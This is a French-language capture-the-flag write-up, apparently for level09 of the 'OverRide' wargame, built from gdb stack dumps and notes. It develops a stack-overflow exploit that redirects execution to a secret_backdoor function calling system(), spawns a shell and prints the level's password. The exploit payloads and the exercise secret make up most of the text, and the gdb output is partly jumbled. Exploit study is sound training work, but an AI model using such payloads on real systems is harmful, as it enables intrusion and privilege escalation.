@@ -1,0 +1,578 @@
+------> OK Notre exploit consistera a modifier la taille passer a strncpy grace 
+------> a la boucle d'ecriture dans set_username qui ecrit 41 caracteres (et qui
+------> par consequent reecrit au 41eme caractere la taille passer a strncpy),
+------> puis de reecrire grace a ca l'adresse de retour du main.
+
+------> Voyons avec gdb ou se trouve la stack quand le main return:
+
+level09@OverRide:~$ gdb ./level09
+(gdb) b main
+Breakpoint 1 at 0xaac
+(gdb) r
+Starting program: /home/users/level09/level09
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+
+Breakpoint 1, 0x0000555555554aac in main ()
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0000555555554aa8 <+0>:			push   %rbp
+   0x0000555555554aa9 <+1>:			mov    %rsp,%rbp
+=> 0x0000555555554aac <+4>:			lea    0x15d(%rip),%rdi        # 0x555555554c10
+   0x0000555555554ab3 <+11>:		callq  0x555555554730 <puts@plt>
+   0x0000555555554ab8 <+16>:		callq  0x5555555548c0 <handle_msg>
+   0x0000555555554abd <+21>:		mov    $0x0,%eax
+   0x0000555555554ac2 <+26>:		pop    %rbp
+   0x0000555555554ac3 <+27>:		retq
+End of assembler dump.
+(gdb) b *0x0000555555554ac2
+Breakpoint 2 at 0x555555554ac2
+(gdb) c
+Continuing.
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+�>: Msg @Unix-Dude
+>>: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+>: Msg sent!
+
+Breakpoint 2, 0x0000555555554ac2 in main ()
+(gdb)
+
+------> Petit point a present: On a ecrit 39 "A" pour que le "\n" ne reecrive pas la taille
+------> passer a <strncpy>.
+------> Puis on a passer 150 "B" dans le message. Le programme n'en ecrira que 140. Continuons.
+
+(gdb) x $rsp
+0x7fffffffe5e0:	0x0000000000000000		------> RSP se trouve en 0x7fffffffe5e0 !
+(gdb) x/20gx $rbp-0x80
+0x7fffffffe560:	0x4242424242424242	0x4242424242424242
+0x7fffffffe570:	0x4242424242424242	0x4242424242424242
+0x7fffffffe580:	0x4242424242424242	0x4242424242424242
+0x7fffffffe590:	0x4242424242424242	0x4141414142424242
+0x7fffffffe5a0:	0x4141414141414141	0x4141414141414141
+0x7fffffffe5b0:	0x4141414141414141	0x4141414141414141
+0x7fffffffe5c0:	0x0000008c0a414141	0x00007fffffffe5e0
+0x7fffffffe5d0:	0x00007fffffffe5e0	0x0000555555554abd
+0x7fffffffe5e0:	0x0000000000000000	0x00007ffff7a3d7ed
+0x7fffffffe5f0:	0x0000000000000000	0x00007fffffffe6c8
+
+------> Donc si tout est normal en ecrivant 140 + 68 caracteres les 8 prochains bits seront notre adresse de retour du main.
+
+------> MISE EN PLACE:
+------> NX is Enabled pour cet exercice donc on oublie l'execution de shellcode sur la stack.
+------> La methode sera d'ecrire 208 "A" + &<secret_backdoor function>
+
+(gdb) disas secret_backdoor
+Dump of assembler code for function secret_backdoor:
+   0x000055555555488c <+0>:			push   %rbp
+   0x000055555555488d <+1>:			mov    %rsp,%rbp
+   0x0000555555554890 <+4>:			add    $0xffffffffffffff80,%rsp
+   0x0000555555554894 <+8>:			mov    0x20171d(%rip),%rax        # 0x555555755fb8
+   0x000055555555489b <+15>:		mov    (%rax),%rax
+   0x000055555555489e <+18>:		mov    %rax,%rdx
+   0x00005555555548a1 <+21>:		lea    -0x80(%rbp),%rax
+   0x00005555555548a5 <+25>:		mov    $0x80,%esi
+   0x00005555555548aa <+30>:		mov    %rax,%rdi
+   0x00005555555548ad <+33>:		callq  0x555555554770 <fgets@plt>
+   0x00005555555548b2 <+38>:		lea    -0x80(%rbp),%rax
+   0x00005555555548b6 <+42>:		mov    %rax,%rdi
+   0x00005555555548b9 <+45>:		callq  0x555555554740 <system@plt>
+   0x00005555555548be <+50>:		leaveq
+   0x00005555555548bf <+51>:		retq
+End of assembler dump.
+(gdb)
+
+------> Maintenant la ligne de commande devrait resembler a ca:
+------> "A"*40 + (208 + 8) <- 208 pour arriver sur l'adresse de retour + 8 adresse de <secret_backdoor>.
+------> Result:
+------> "A"*40 + "\xd8" + "\n" + "A"*40 + "\xd8" + "A"*168 + "\x55\x55\x55\x55\x48\x8c"[::-1] + "\n"
+------> Test:
+
+level09@OverRide:~$ bash | gdb ./level09
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
+(gdb) Undefined command: "RELRO".  Try "help".
+(gdb) Undefined command: "".  Try "help".
+(gdb) level09@OverRide:~$ echo b main
+level09@OverRide:~$ Breakpoint 1 at 0xaac
+(gdb) echo r
+level09@OverRide:~$ Starting program: /home/users/level09/level09
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+
+Breakpoint 1, 0x0000555555554aac in main ()
+(gdb) echo disas main
+level09@OverRide:~$ Dump of assembler code for function main:
+   0x0000555555554aa8 <+0>:	push   %rbp
+   0x0000555555554aa9 <+1>:	mov    %rsp,%rbp
+=> 0x0000555555554aac <+4>:	lea    0x15d(%rip),%rdi        # 0x555555554c10
+   0x0000555555554ab3 <+11>:	   callq  0x555555554730 <puts@plt>
+   0x0000555555554ab8 <+16>:	   callq  0x5555555548c0 <handle_msg>
+   0x0000555555554abd <+21>:	   mov    $0x0,%eax
+   0x0000555555554ac2 <+26>:	   pop    %rbp
+   0x0000555555554ac3 <+27>:	   retq
+End of assembler dump.
+(gdb) echo b *0x0000555555554ac2
+level09@OverRide:~$ Breakpoint 2 at 0x555555554ac2
+(gdb) echo c
+level09@OverRide:~$ Continuing.
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+python -c 'print "A"*40 + "\xd8"'
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+level09@OverRide:~$ python -c 'print "A"*40 + "\xd8" + "A"*168 + "\x55\x55\x55\x55\x48\x8c"[::-1]'
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555554931 in handle_msg ()
+(gdb) level09@OverRide:~$ echo disas
+level09@OverRide:~$ Dump of assembler code for function handle_msg:
+   0x00005555555548c0 <+0>:	push   %rbp
+   0x00005555555548c1 <+1>:	mov    %rsp,%rbp
+   0x00005555555548c4 <+4>:	sub    $0xc0,%rsp
+   0x00005555555548cb <+11>:	   lea    -0xc0(%rbp),%rax
+   0x00005555555548d2 <+18>:	   add    $0x8c,%rax
+   0x00005555555548d8 <+24>:	   movq   $0x0,(%rax)
+   0x00005555555548df <+31>:	   movq   $0x0,0x8(%rax)
+   0x00005555555548e7 <+39>:	   movq   $0x0,0x10(%rax)
+   0x00005555555548ef <+47>:	   movq   $0x0,0x18(%rax)
+   0x00005555555548f7 <+55>:	   movq   $0x0,0x20(%rax)
+   0x00005555555548ff <+63>:	   movl   $0x8c,-0xc(%rbp)
+   0x0000555555554906 <+70>:	   lea    -0xc0(%rbp),%rax
+   0x000055555555490d <+77>:	   mov    %rax,%rdi
+   0x0000555555554910 <+80>:	   callq  0x5555555549cd <set_username>
+   0x0000555555554915 <+85>:	   lea    -0xc0(%rbp),%rax
+   0x000055555555491c <+92>:	   mov    %rax,%rdi
+   0x000055555555491f <+95>:	   callq  0x555555554932 <set_msg>
+   0x0000555555554924 <+100>:	   lea    0x295(%rip),%rdi        # 0x555555554bc0
+   0x000055555555492b <+107>:	   callq  0x555555554730 <puts@plt>
+   0x0000555555554930 <+112>:	   leaveq
+=> 0x0000555555554931 <+113>:	   retq
+End of assembler dump.
+(gdb) x $esp
+x: command not found
+level09@OverRide:~$ echo 'x $esp'
+0xffffffffffffe5d8:	Cannot access memory at address 0xffffffffffffe5d8
+(gdb) level09@OverRide:~$ echo 'x $ebp'
+0x41414141:				  Cannot access memory at address 0x41414141
+(gdb) level09@OverRide:~$
+
+----> AH ! j'ai pas penser a l'adresse de retour de <handle_msg>
+----> ETAPE:
+			- Breakpoint a la fin de <handle_msg>
+			- Check de la stack
+---->
+
+(gdb) level09@OverRide:~$ echo b *0x0000555555554930
+Breakpoint 3 at 0x555555554930
+(gdb) level09@OverRide:~$ echo r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) [answered Y; input not from terminal]
+Starting program: /home/users/level09/level09
+level09@OverRide:~$ warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+
+Breakpoint 1, 0x0000555555554aac in main ()
+(gdb) echo c
+level09@OverRide:~$ Continuing.
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+python -c 'print "A"*40 + "\xd8"'
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+level09@OverRide:~$ python -c 'print "A"*40 + "\xd8"
+> '
+>>: >: Msg sent!
+
+Breakpoint 3, 0x0000555555554930 in handle_msg ()
+(gdb) level09@OverRide:~$ echo disas
+Dump of assembler code for function handle_msg:
+   0x00005555555548c0 <+0>:			push   %rbp
+   0x00005555555548c1 <+1>:			mov    %rsp,%rbp
+   0x00005555555548c4 <+4>:			sub    $0xc0,%rsp
+   0x00005555555548cb <+11>:		lea    -0xc0(%rbp),%rax
+   0x00005555555548d2 <+18>:		add    $0x8c,%rax
+   0x00005555555548d8 <+24>:		movq   $0x0,(%rax)
+   0x00005555555548df <+31>:		movq   $0x0,0x8(%rax)
+   0x00005555555548e7 <+39>:		movq   $0x0,0x10(%rax)
+   0x00005555555548ef <+47>:		movq   $0x0,0x18(%rax)
+   0x00005555555548f7 <+55>:		movq   $0x0,0x20(%rax)
+   0x00005555555548ff <+63>:		movl   $0x8c,-0xc(%rbp)
+   0x0000555555554906 <+70>:		lea    -0xc0(%rbp),%rax
+   0x000055555555490d <+77>:		mov    %rax,%rdi
+---Type <return> to continue, or q <return> to quit---level09@OverRide:~$ echo
+   0x0000555555554910 <+80>:  callq  0x5555555549cd <set_username>
+   0x0000555555554915 <+85>:  lea    -0xc0(%rbp),%rax
+   0x000055555555491c <+92>:  mov    %rax,%rdi
+   0x000055555555491f <+95>:  callq  0x555555554932 <set_msg>
+   0x0000555555554924 <+100>: lea    0x295(%rip),%rdi        # 0x555555554bc0
+   0x000055555555492b <+107>: callq  0x555555554730 <puts@plt>
+=> 0x0000555555554930 <+112>: leaveq
+   0x0000555555554931 <+113>: retq
+End of assembler dump.
+(gdb) level09@OverRide:~$ echo 'x $rsp'
+0x7fffffffe510:			  0x4141414141414141
+(gdb) level09@OverRide:~$ echo 'x/20gx $rsp-32'
+0x7fffffffe4f0:			  0x0000000000000000	0x00007fffffffe5d0
+0x7fffffffe500:			  0x0000555555554790	0x0000555555554930
+0x7fffffffe510:			  0x4141414141414141	0x4141414141414141
+0x7fffffffe520:			  0x4141414141414141	0x4141414141414141
+0x7fffffffe530:			  0x4141414141414141	0x0000000000000ad8
+0x7fffffffe540:			  0x0000000000000000	0x0000000000000000
+0x7fffffffe550:			  0x0000000000000000	0x0000000000000000
+0x7fffffffe560:			  0x0000000000000000	0x0000000000000000
+0x7fffffffe570:			  0x0000000000000000	0x0000000000000000
+0x7fffffffe580:			  0x0000000000000000	0x0000000000000000
+
+------> RSP est en 0x7fffffffe510.
+------> J'ai l'impression que c'est les premiers "A" qui en sont la cause.
+------> On refait la manip mais avec des A, B, C, et D.
+
+(gdb) level09@OverRide:~$ echo r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) [answered Y; input not from terminal]
+Starting program: /home/users/level09/level09
+level09@OverRide:~$ warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+
+Breakpoint 1, 0x0000555555554aac in main ()
+(gdb) echo c
+Continuing.
+level09@OverRide:~$ --------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+python -c 'print "A"*8 + "B"*8 + "C"*8 + "D"*7'				<- 
+>>: >: Welcome, AAAAAAAABBBBBBBBCCCCCCCCDDDDDDD
+>: Msg @Unix-Dude
+python -c 'print "E"*8 + "F"*8 + "G"*8 + "H"*8'				<-
+>>: >: Msg sent!
+
+---Type <return> to continue, or q <return> to quit---level09@OverRide:~$ echo
+Breakpoint 3, 0x0000555555554930 in handle_msg ()
+(gdb) level09@OverRide:~$ echo 'x $rsp'
+0x7fffffffe510:			  0x4545454545454545
+
+-----> Conclusion: On reecrit l'adresse de retour de <handle_msg> au debut du deuxieme fgets !
+-----> On reessaye:
+
+(gdb) level09@OverRide:~$ echo r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) [answered Y; input not from terminal]
+Starting program: /home/users/level09/level09
+level09@OverRide:~$ warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+
+Breakpoint 1, 0x0000555555554aac in main ()
+(gdb) echo c
+Continuing.
+level09@OverRide:~$ --------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+python -c 'print "A"*8 + "B"*8 + "C"*8 + "D"*7'
+>>: >: Welcome, AAAAAAAABBBBBBBBCCCCCCCCDDDDDDD
+>: Msg @Unix-Dude
+level09@OverRide:~$ python -c 'print "E"*8 + "F"*8 + "G"*8 + "H"*8'
+>>: >: Msg sent!
+
+---Type <return> to continue, or q <return> to quit---level09@OverRide:~$ echo
+Breakpoint 3, 0x0000555555554930 in handle_msg ()
+(gdb) level09@OverRide:~$ echo 'x $rsp'
+0x7fffffffe510:			  0x4545454545454545
+(gdb) level09@OverRide:~$ echo r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) [answered Y; input not from terminal]
+Starting program: /home/users/level09/level09
+level09@OverRide:~$ warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+
+Breakpoint 1, 0x0000555555554aac in main ()
+(gdb) echo c
+Continuing.
+level09@OverRide:~$ --------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+python -c 'print "A"'
+>>: >: Welcome, A
+>: Msg @Unix-Dude
+level09@OverRide:~$ python -c 'print "\x55\x55\x55\x55\x48\x8c"[::-1]'
+>>: >: Msg sent!
+
+Breakpoint 3, 0x0000555555554930 in handle_msg ()
+(gdb) level09@OverRide:~$ echo 'x $rsp'
+0x7fffffffe510:			  0x000a55555555488c
+
+------> Donc la si je continue on devrait entrer dans <secret_function>:
+
+(gdb) level09@OverRide:~$ echo c
+Continuing.
+
+Breakpoint 2, 0x0000555555554ac2 in main ()
+(gdb) level09@OverRide:~$ echo c
+Continuing.
+[Inferior 1 (process 2669) exited normally]
+(gdb) level09@OverRide:~$
+
+---> et ba pas du tout.... lol
+
+(gdb) level09@OverRide:~$ echo r
+Starting program: /home/users/level09/level09
+level09@OverRide:~$ warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+
+Breakpoint 1, 0x0000555555554aac in main ()
+(gdb) echo c
+Continuing.
+level09@OverRide:~$ --------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+A
+A: command not found
+level09@OverRide:~$ echo b
+>>: >: Welcome, b
+>: Msg @Unix-Dude
+level09@OverRide:~$ echo 1234
+>>: >: Msg sent!
+
+Breakpoint 3, 0x0000555555554930 in handle_msg ()
+(gdb) level09@OverRide:~$ echo 'x $rsp'
+0x7fffffffe510:			  0x0000000a34333231
+(gdb) level09@OverRide:~$ echo 'x $rbp'
+0x7fffffffe5d0:			  0x00007fffffffe5e0
+(gdb) level09@OverRide:~$ echo 'x/20gx $rsp'
+0x7fffffffe510:			  0x0000000a34333231	0x0000000000000000
+0x7fffffffe520:			  0x0000000000000000	0x0000000000000000
+0x7fffffffe530:			  0x0000000000000000	0x0000000000000000
+0x7fffffffe540:			  0x0000000000000000	0x0000000000000000
+0x7fffffffe550:			  0x0000000000000000	0x0000000000000000
+0x7fffffffe560:			  0x0000000000000000	0x0000000000000000
+0x7fffffffe570:			  0x0000000000000000	0x0000000000000000
+0x7fffffffe580:			  0x0000000000000000	0x0000000000000000
+0x7fffffffe590:			  0x0000000000000000	0x00000a6200000000
+0x7fffffffe5a0:			  0x0000000000000000	0x0000000000000000
+(gdb) level09@OverRide:~$ echo 'x/20gx $rbp'
+0x7fffffffe5d0:			  0x00007fffffffe5e0	0x0000555555554abd
+0x7fffffffe5e0:			  0x0000000000000000	0x00007ffff7a3d7ed
+0x7fffffffe5f0:			  0x0000000000000000	0x00007fffffffe6c8
+0x7fffffffe600:			  0x0000000155554000	0x0000555555554aa8
+0x7fffffffe610:			  0x0000000000000000	0xd3a5f529eeff01d8
+0x7fffffffe620:			  0x0000555555554790	0x00007fffffffe6c0
+0x7fffffffe630:			  0x0000000000000000	0x0000000000000000
+0x7fffffffe640:			  0x2c5a0ad6251f01d8	0x2c5a1a6e41af01d8
+0x7fffffffe650:			  0x00007fff00000000	0x0000000000000000
+0x7fffffffe660:			  0x0000000000000000	0x0000555555554ad0
+(gdb) level09@OverRide:~$ disas
+disas: command not found
+level09@OverRide:~$ echo disas
+Dump of assembler code for function handle_msg:
+   0x00005555555548c0 <+0>:			push   %rbp
+   0x00005555555548c1 <+1>:			mov    %rsp,%rbp
+   0x00005555555548c4 <+4>:			sub    $0xc0,%rsp
+   0x00005555555548cb <+11>:		lea    -0xc0(%rbp),%rax
+   0x00005555555548d2 <+18>:		add    $0x8c,%rax
+   0x00005555555548d8 <+24>:		movq   $0x0,(%rax)
+   0x00005555555548df <+31>:		movq   $0x0,0x8(%rax)
+   0x00005555555548e7 <+39>:		movq   $0x0,0x10(%rax)
+   0x00005555555548ef <+47>:		movq   $0x0,0x18(%rax)
+   0x00005555555548f7 <+55>:		movq   $0x0,0x20(%rax)
+   0x00005555555548ff <+63>:		movl   $0x8c,-0xc(%rbp)
+   0x0000555555554906 <+70>:		lea    -0xc0(%rbp),%rax
+   0x000055555555490d <+77>:		mov    %rax,%rdi
+   0x0000555555554910 <+80>:		callq  0x5555555549cd <set_username>
+   0x0000555555554915 <+85>:		lea    -0xc0(%rbp),%rax
+   0x000055555555491c <+92>:		mov    %rax,%rdi
+   0x000055555555491f <+95>:		callq  0x555555554932 <set_msg>
+   0x0000555555554924 <+100>:		lea    0x295(%rip),%rdi        # 0x555555554bc0
+   0x000055555555492b <+107>:		callq  0x555555554730 <puts@plt>
+=> 0x0000555555554930 <+112>:		leaveq
+   0x0000555555554931 <+113>:		retq
+End of assembler dump.
+(gdb) level09@OverRide:~$ echo stepi
+0x0000555555554931 in handle_msg ()
+(gdb) level09@OverRide:~$ echo 'x $rsp'
+0x7fffffffe5d8:			  0x0000555555554abd
+(gdb) level09@OverRide:~$ echo 'x $rbp'
+0x7fffffffe5e0:			  0x0000000000000000
+(gdb) level09@OverRide:~$ echo stepi
+0x0000555555554abd in main ()
+(gdb) level09@OverRide:~$ echo 'x $rsp'
+0x7fffffffe5e0:			  0x0000000000000000
+(gdb) level09@OverRide:~$ echo 'x $rbp'
+0x7fffffffe5e0:			  0x0000000000000000
+(gdb) level09@OverRide:~$ echo disas
+Dump of assembler code for function main:
+---Type <return> to continue, or q <return> to quit---level09@OverRide:~$ echo
+   0x0000555555554aa8 <+0>:	  push   %rbp
+   0x0000555555554aa9 <+1>:	  mov    %rsp,%rbp
+   0x0000555555554aac <+4>:	  lea    0x15d(%rip),%rdi        # 0x555555554c10
+   0x0000555555554ab3 <+11>:  callq  0x555555554730 <puts@plt>
+   0x0000555555554ab8 <+16>:  callq  0x5555555548c0 <handle_msg>
+=> 0x0000555555554abd <+21>:  mov    $0x0,%eax
+   0x0000555555554ac2 <+26>:  pop    %rbp
+   0x0000555555554ac3 <+27>:  retq
+End of assembler dump.
+
+----> OK donc si jai bien compris l'adresse de retour de <handle_msg> se trouve en 0x7fffffffe5d8.
+level09@OverRide:~$ echo p 0x5e0 - 0x510
+$1 = 208
+----> et donc il va falloir ecrire 200 caractere + &<secret_backdoor>
+
+(gdb) level09@OverRide:~$ echo r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) [answered Y; input not from terminal]
+Starting program: /home/users/level09/level09
+level09@OverRide:~$ warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+
+Breakpoint 1, 0x0000555555554aac in main ()
+(gdb) echo c
+Continuing.
+level09@OverRide:~$ --------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+python -c 'print "A"*40 + "\xd0"'
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+level09@OverRide:~$ python -c 'print "A"*40 + "\xd0" + "B"*159 + "\x55\x55\x55\x55\x48\x8c"[::-1]'
+>>: >: Msg sent!
+
+level09@OverRide:~$ Breakpoint 3, 0x0000555555554930 in handle_msg ()
+(gdb) echo stepi
+0x0000555555554931 in handle_msg ()
+(gdb) level09@OverRide:~$ echo 'x $rsp'
+0x7fffffffe5d8:			  0x000a55555555488c
+(gdb) level09@OverRide:~$ echo 'x $rbp'
+0x4242424242424242:		  Cannot access memory at address 0x4242424242424242
+
+------> J'ai galerer a le voir mais ESP vaut 0x000a55555555488c, IL Y A 0x000a !!!!!!!!
+------> et ca ca faisait SEGV le programme.
+------> On quitte GDB et on REESSAYE :
+
+level09@OverRide:~$ python -c 'print "A"*40 + "\xd0" + "\n" + "B"*200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]' | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+sh: 1: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB: not found
+Segmentation fault (core dumped)
+
+----> OMG ON LANCE SH !!!! mais du coup pas avec le bon argument !!!!
+----> on recherche la position :
+
+level09@OverRide:~$python -c 'print "A"*40 + "\xd0" + "\n" + "/bin/sh ;" + "B"*192 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]' | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+Segmentation fault (core dumped)
+level09@OverRide:~$ python -c 'print "A"*40 + "\xd0" + "\n" + "/bin/sh ;" + "B"*191 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]' | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+sh: 1: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB: not found
+Segmentation fault (core dumped)
+level09@OverRide:~$ python -c 'print "A"*40 + "\xd0" + "\n" + "B"*191 + "/bin/sh ;" + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]' | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+sh: 1: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB/bin/sh: Permission denied
+sh: 1: bin/sh: Permission denied
+Segmentation fault (core dumped)
+
+----> Donc c'est ni au debut, ni a la fin du deuxieme fgets....
+
+level09@OverRide:~$ python -c 'print "A"*40 + "\xd0" + "\n" + "/bin/sh ; "*20 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]' | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+sh: 1: in/sh: Permission denied
+sh: 1: in/sh: Permission denied
+Segmentation fault (core dumped)
+level09@OverRide:~$ python -c 'print "A"*40 + "\xd0" + "\n" + "B"*20 + "/bin/sh ; "*18 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]' | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+sh: 1: in/sh: Permission denied
+sh: 1: in/sh: Permission denied
+Segmentation fault (core dumped)
+level09@OverRide:~$ python -c 'print "A"*40 + "\xd0" + "\n" + "B"*100 + "/bin/sh ; "*10 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]' | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+sh: 1: BBBBBBBBBBBBBBBBBBBBBBBBBBBB/bin/sh: Permission denied
+sh: 1: in/sh: Permission denied
+Segmentation fault (core dumped)
+
+--------> ON SE RAPPROCHE !!!!
+
+level09@OverRide:~$ python -c 'print "A"*40 + "\xd0" + "\n" + "B"*80 + "/bin/sh ; "*12 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]' | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+sh: 1: BBBBBBBB/bin/sh: Permission denied
+sh: 1: in/sh: Permission denied
+Segmentation fault (core dumped)
+
+-----> TROUVER !!!!!!!
+-----> Si j'ecris 72 "B" le reste sera l'argument de <system> !!
+-----> Comme on peut pas envoyer de "\x00" on va essayer de lui envoyer "/bin/sh" suivi de X " " (espace). !!!
+
+
+
+level09@OverRide:~$ python -c 'print "A"*40 + "\xd0" + "\n" + "B"*72 + "/bin/sh " + " "*120 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]' | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+Segmentation fault (core dumped)
+
+-------> Essayons de le bloquer avec 'cat' :
+
+level09@OverRide:~$ (python -c 'print "A"*40 + "\xd0" + "\n" + "B"*72 + "/bin/sh " + " "*120 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]' ; cat) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+
+
+
+
+ALLLLLLLLLEEEEEEEEEEZZZZZZZZ !!!!!!!
